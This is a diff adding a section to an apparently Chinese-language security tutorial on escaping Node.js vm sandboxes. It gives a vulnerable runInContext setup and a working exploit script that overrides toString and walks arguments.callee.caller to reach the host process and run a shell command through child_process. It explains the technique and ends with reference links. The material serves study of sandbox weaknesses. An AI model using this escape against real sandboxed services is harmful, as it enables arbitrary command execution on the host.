@@ -71,6 +71,46 @@ console.log(y1);
 
 >注意：数字，字符串，布尔这类都是primitive类型，在传递的过程中他们是将值传递过去而不是引用，所以是没有办法用来利用的
 
+#### 外界调用函数触发
+这个触发方式有些类似于PHP反序列化魔术方法的触发
 
+```js
+const vm = require('vm');
+const script = `...`;
+const sandbox = Object.create(null);
+const context = vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log('Hello ' + res)
+```
 
+exp
+
+```js
+const vm = require('vm');
+const script = 
+`(() => {
+    const a = {}
+    a.toString = function () {
+      const cc = arguments.callee.caller;
+      const p = (cc.constructor.constructor('return process'))();
+      return p.mainModule.require('child_process').execSync('whoami').toString()
+    }
+    return a
+  })()`;
+
+const sandbox = Object.create(null);
+const context = new vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log('Hello ' + res)
+```
+
+在这个逃逸中用到了`arguments.callee.caller`，作用是返回函数的调用者
+- arguments是一个**类数组对象**，在函数调用时创建，它存储的是实际传递给函数的参数，并不局限于函数定义时的参数列表。
+- callee 是arguments对象的一个属性, 它是一个指向 arguments 对象所在函数的指针。
+- 这个属性中保存着调用当前函数的函数的引用， 如果是在全局作用域中调用当前函数，它的值为 null。
+
+在上面的exp中重构了函数`a`的toString方法，因此在下面`console.log('Hello ' + res)`的过程中触发了a函数实现了逃逸
 ## 参考文章
+https://xz.aliyun.com/t/11859
+
+[[函数] arguments、callee、caller是啥？ - 掘金 (juejin.cn)](https://juejin.cn/post/7056285377899790372)
